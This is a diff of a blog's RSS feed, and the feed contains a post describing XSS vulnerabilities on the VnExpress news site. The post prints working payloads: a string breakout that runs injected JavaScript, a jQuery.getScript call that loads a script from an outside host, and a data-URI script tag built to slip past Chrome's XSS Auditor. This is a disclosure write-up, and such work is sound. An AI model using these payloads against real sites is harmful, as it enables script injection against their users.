@@ -6,6 +6,8 @@
     <description>Recent content in Security on Cong Nguyen</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
+    <managingEditor>ntcong.it@gmail.com (Cong Nguyen)</managingEditor>
+    <webMaster>ntcong.it@gmail.com (Cong Nguyen)</webMaster>
     <lastBuildDate>Tue, 22 Mar 2016 16:20:20 +0700</lastBuildDate>
     <atom:link href="http://blog.ntcong.it/tags/security/index.xml" rel="self" type="application/rss+xml" />
     
@@ -13,7 +15,7 @@
       <title>XSS vulnerabilities on VnExpress</title>
       <link>http://blog.ntcong.it/post/xss-with-vnexpress/</link>
       <pubDate>Tue, 22 Mar 2016 16:20:20 +0700</pubDate>
-      
+      <author>ntcong.it@gmail.com (Cong Nguyen)</author>
       <guid>http://blog.ntcong.it/post/xss-with-vnexpress/</guid>
       <description>
 
@@ -41,19 +43,19 @@
 
 &lt;p&gt;But it&amp;rsquo;s still not very good since it only works on Firefox, so I did a quick look at the HTML source code and found this&lt;/p&gt;
 
-&lt;div class=&#34;highlight&#34; style=&#34;background: #002b36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span style=&#34;color: #859900&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color: #839496&#34;&gt;strKeyWord&lt;/span&gt;  &lt;span style=&#34;color: #839496&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #2aa198&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #839496&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #dc322f&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #839496&#34;&gt;;&lt;/span&gt;
-&lt;span style=&#34;color: #859900&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color: #839496&#34;&gt;blData&lt;/span&gt;      &lt;span style=&#34;color: #839496&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #2aa198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #839496&#34;&gt;;&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;strKeyWord&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;blData&lt;/span&gt;      &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Why they include the search parameter on a Javascript code, without any protection is beyond me, but this will bypass all the protection XSS Auditor provides to you, because it&amp;rsquo;s not a normal XSS payload anymore, any text you inputed in will run on javascript directly. The new payload will look like this.
-&lt;div class=&#34;highlight&#34; style=&#34;background: #002b36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span style=&#34;color: #2aa198&#34;&gt;&amp;quot;;alert(1);&amp;quot;&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;quot;;alert(1);&amp;quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;/p&gt;
 
 &lt;p&gt;And it will not be detected by Chrome or IE&amp;rsquo;s XSS Auditor. Extensible is a must, so I load the script from outside
-&lt;div class=&#34;highlight&#34; style=&#34;background: #002b36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span style=&#34;color: #2aa198&#34;&gt;&amp;quot;;jQuery.getScript(&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #839496&#34;&gt;http:&lt;/span&gt;&lt;span style=&#34;color: #586e75; font-style: italic&#34;&gt;//js.js&amp;quot;) .done(function() {});&amp;quot;&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;quot;;jQuery.getScript(&amp;quot;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;http&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;//js.js&amp;quot;) .done(function() {});&amp;quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;/p&gt;
 
 &lt;p&gt;Pretty neat, huh?&lt;/p&gt;
@@ -85,8 +87,8 @@
 
 &lt;p&gt;So Chrome did a great job to find a XSS payload on the URL, and prevent it from running. But there&amp;rsquo;s a flaw: it won&amp;rsquo;t stop an invalid XSS payload, like a script without closing tag. And the HTML parse won&amp;rsquo;t care about the content inside the &lt;script&gt; tag, as long as you include a src attribute. This payload requires you to have a closing &lt;/script&gt; tag, which most website nowaday have to execute javascript after the main content finishes loading. The payload looks like this&lt;/p&gt;
 
-&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002b36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span style=&#34;color: #dc322f&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #839496&#34;&gt;&amp;gt;&amp;lt;script/src=data:,alert(&lt;/span&gt;&lt;span style=&#34;color: #2aa198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #839496&#34;&gt;)%&lt;/span&gt;&lt;span style=&#34;color: #2aa198&#34;&gt;26&lt;/span&gt;&lt;span style=&#34;color: #839496&#34;&gt;sol;%&lt;/span&gt;&lt;span style=&#34;color: #2aa198&#34;&gt;26&lt;/span&gt;&lt;span style=&#34;color: #839496&#34;&gt;sol;&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;src&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;alert&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;26&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;sol&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;26&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;sol&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;/p&gt;
 
 &lt;p&gt;The result html will looks like this: &amp;lt;script src=&amp;ldquo;data:,alert(1)//&amp;amp;q=xss&amp;hellip;.&amp;ldquo;&amp;gt;[a lot of HTML]&amp;lt;/script&amp;gt;. Andddd it runs on Chrome. And also it&amp;rsquo;s pretty funny to see VnExpress do some weird shit with their site, results in the alert(1) display several times when the page loads (view count increase maybe?)&lt;/p&gt;
